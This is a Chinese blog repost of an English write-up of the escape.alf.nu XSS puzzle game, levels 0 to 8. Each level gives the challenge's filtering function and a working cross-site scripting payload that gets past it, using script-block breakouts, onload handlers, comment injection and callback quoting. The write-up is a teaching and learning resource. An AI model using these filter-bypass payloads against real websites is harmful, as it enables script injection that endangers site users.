title: escape-Write-ups (Part 1)
date: 2014-10-12 14:00:48
tags: XSS
categories: 前端安全
---

<hr/>

##前言

这是国外的XSS游戏[escape.alf.nu](http://escape.alf.nu),国内也有类似的比如	[prompt.ml](http://prompt.ml)	

<!--more-->

花了好久好久才找到的Write-ups,因为是一年前的游戏,没找到中文的翻译

于是直接贴在这里了,原链接为[点我](http://www.pwntester.com/blog/2014/01/06/escape-alf-nu-xss-challenges-write-ups-part-148/)

因为原文是分为Part1和Part2,我懒得合并,就按照原样分开贴了

请移步[Part2](http://evilddog.github.io/2014/10/12/escape-alf-nu-write-ups-2/)

版权所有,侵删请联系root.evilddog#gmail.com

##原文

   These are my solutions to    Erling Ellingsen    escape.alf.nu XSS challenges    . I found them very interesting and I learnt a lot from them (especially from the last ones to be published in Part 2). Im publishing my results since the game has been online for a long time now and there are already some sites with partial results.  

My suggestion, if you havent done it so far, is to go and try to solve them by yourselves…. so come on, dont be lazy, stop reading here and give them a try …

…

…

…

…

Ok so if you have already solve them or need some hits, here are my solutions

###Level 0:

```
	function escape(s) {
		// Warmup.  
		return '<script>console.log("'+s+'");</script>';
	}
```

There is no encoding so the easiest solution is to close “log” call and inject our “alert”

Solution:


```
	");alert(1,"
```

###Level 1:


```
	function escape(s) {
		// Escaping scheme courtesy of Adobe Systems, Inc.  
		s = s.replace(/"/g, '\\"');  
		return '<script>console.log("' + s + '");</script>';
	}
```


Function is escaping double quotes by adding two slashes. Shortest solution is to inject    \“    so the escape function turns it into


```
	\\\"
```


Effectively escaping the backslash but not the double quotes.

Solution:

```
	\");alert(1)//
```


###Level 2:

```
	function escape(s) {  
		s = JSON.stringify(s);  
		return '<script>console.log(' + s + ');</script>';
	}
```


JSON.stringify() will escape double quotes (“) into (\”) but it does not escaps angle brackets (<>), so we can close the current script block and start a brand new one.

Solution:

```
	</script><script>alert(1)//
```

###Level 3:

```
	function escape(s) {  
		var url = 'javascript:console.log(' + JSON.stringify(s) + ')';
		console.log(url);  
		
		var a = document.createElement('a');  
		a.href = url;  
		document.body.appendChild(a);  
		a.click();
	}
```


Again (“) is escaped but since we are within a URL context we can use URL encoding. In this case %22 for (”)

Solution:


```
	%22);alert(1)//
```

###Level 4:

```
	function escape(s) {  
		var text = s.replace(/</g, '&lt;').replace('"', '&quot;');  
		// URLs  
		text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');  
		// [[img123|Description]]  
		text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');  
		return text;
	}
```

The following characters are replaced:

- < → &lt; (all ocurrences)

- " → &quot; (just the first occurrence)

The escape function also use a template like [[src|alt]] that becomes、


```
	<img alt="alt" src="src.gif">
```


We can use this template with any    src    and an    alt    starting with a double quote (“) that will be escaped, a second double quote (”) that won’t be escaped and then a new event handler like    onload=“alert(1)    that will be closed by the double quote inserted by the template.

Solution:

```
	[[a|""onload="alert(1)]]
```


It will be rendered as:
![](http://evilddog.qiniudn.com/escape.alf.nu_1.png)
 
###Level 5:
 
```
	function escape(s) {
   		// Level 4 had a typo, thanks Alok.
		// If your solution for 4 still works here, you can go back and get more points on level 4 now.
		var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
    	// URLs
    	text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
    	// [[img123|Description]]
    	text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
    	return text;
	}
```


Now we cannot rely on the (    “    ) regexp typo but we can still use the template function to generate an image tag executing our    alert(1)    when loaded. We will use any    src    and a URL that will be replaced by the second replace function.

Solution:

```
	[[a|http://onload='alert(1)']]
```



The first replace function wont trigger with this payload

The second replace function will act on the URL getting:


```
	[[a|<a href="http://onload='alert(1)']]">http://onload='alert(1)']]</a>
```


The third replace function will create our      img      tag

It will be rendered as:
![](http://evilddog.qiniudn.com/escape.alf.nu_2.png)

 
###Level 6:

```
	function escape(s) {  
		// Slightly too lazy to make two input fields.  
		// Pass in something like "TextNode#foo"  
		var m = s.split(/#/);  
		// Only slightly contrived at this point.  
		var a = document.createElement('div');  
		a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));  
		return a.innerHTML;
	}
```


The trick is to review all the functions in the DOM that begin with “create” and that dont escape characters. The shortest one is to use “createComment”. For example    Comment#<foo>    will create the following code:

	<!--<foo>-->

From there, its easy to go to:


```
	Comment#><svg onload=alert(1)
```


That will render:

```
	<!--><svg onload=alert(1)-->
```


###Level 7:

```
	function escape(s) {  
		// Pass inn "callback#userdata"  
		var thing = s.split(/#/);  
		if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';  
		var obj = {'userdata': thing[1] };  
		var json = JSON.stringify(obj).replace(/</g, '\\u003c');  
		return "<script>" + thing[0] + "(" + json +")</script>";
	}
```


We will enclose the opening bracket and the json fixed contents with single quotes to transform it into a string and then we will be able to inject our js payload:

Solution:

```
	'#';alert(1)//
```


It will render:


```
	<script>'({"userdata":"';alert(1)//"})</script>
```

###Level 8:

```
	function escape(s) {  
		// Courtesy of Skandiabanken  
		return '<script>console.log("' + s.toUpperCase() + '")</script>';
	}
```


There is no escaping function, only an upper case, so we can close the exisiting"script"tag and create a new tag (case insensitive) with an    onload  script using no alpha characters:

These are some valid solutions:

```
	</script><svg><script>alert(1)//   (52)
	</script><svg onload=alert(1)//   (51)
	</script><svg onload=alert(1)//   (50)
```


I guess people solving the challange with 28 characters or so did something like:


```
	</script><script src="<very short domain>">
```

##[Part2](http://evilddog.github.io/2014/10/12/escape-alf-nu-write-ups-2/)
